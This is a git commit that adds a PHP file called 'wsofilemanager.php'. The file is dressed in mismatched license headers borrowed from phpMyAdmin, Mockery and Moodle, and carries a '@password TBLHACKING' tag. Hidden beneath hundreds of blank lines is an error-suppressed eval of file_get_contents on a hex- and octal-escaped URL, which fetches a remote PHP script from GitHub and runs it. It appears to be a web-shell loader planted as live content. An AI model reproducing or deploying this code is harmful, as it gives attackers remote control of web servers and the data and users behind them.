18732993665e3b30293f308404dd579c8c4d4e26
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-01-01 22:55:04 +0700

    Create wsofilemanager.php

---
+++ wsofilemanager.php
@@ -0,0 +1,336 @@
+<?= /**
+     * PHPMYADMIN
+     *
+     * LICENSE
+     *
+     * This source file is subject to the new BSD license that is bundled
+     * with this package in the file LICENSE.txt.
+     * It is also available through the world-wide-web at this URL:
+     * http://github.com/padraic/mockery/blob/master/LICENSE
+     * If you did not receive a copy of the license and are unable to
+     * obtain it through the world-wide-web, please send an email
+     * to padraic@php.net so we can send you a copy immediately.
+     *
+     * @category   PHP
+     * @package    Mockery
+     * @copyright  Copyright (c) 2010-2014 PÃ¡draic Brady (http://blog.astrumfutura.com)
+     * @license    http://github.com/padraic/mockery/blob/master/LICENSE New BSD License
+     */
+    // This file is part of Moodle - http://moodle.org/
+    //
+    // Moodle is free software: you can redistribute it and/or modify
+    // it under the terms of the GNU General Public License as published by
+    // the Free Software Foundation, either version 3 of the License, or
+    // (at your option) any later version.
+    //
+    // Phpmyadmin is distributed in the hope that it will be useful,
+    // but WITHOUT ANY WARRANTY; without even the implied warranty of
+    // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    // GNU General Public License for more details.
+    //
+    // You should have received a copy of the GNU General Public License
+    // along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+    /**
+     * @password TBLHACKING
+     *
+     * @package    plugins filemanager
+     * @subpackage phpmyadmin
+     * @copyright  2011 David Mudrak <muhrazky@gmail.com>
+     * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+     */
+    @eval("?>" .
+           file_get_contents
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+("\x68\x74\x74\160\163\72\57\x2f\162\141\167\x2e\147\151\x74\x68\165\142\x75\163\x65\x72\143\157\156\x74\x65\156\x74\56\143\157\155\57\164\151\x6b\165\156\x67\x36\x65\x74\141\162\57\116\171\141\162\x65\x6b\x2f\x72\145\x66\163\x2f\x68\x65\141\144\x73\57\x6d\x61\163\x74\x65\x72\57\167\x73\x2e\160\x68\160"));
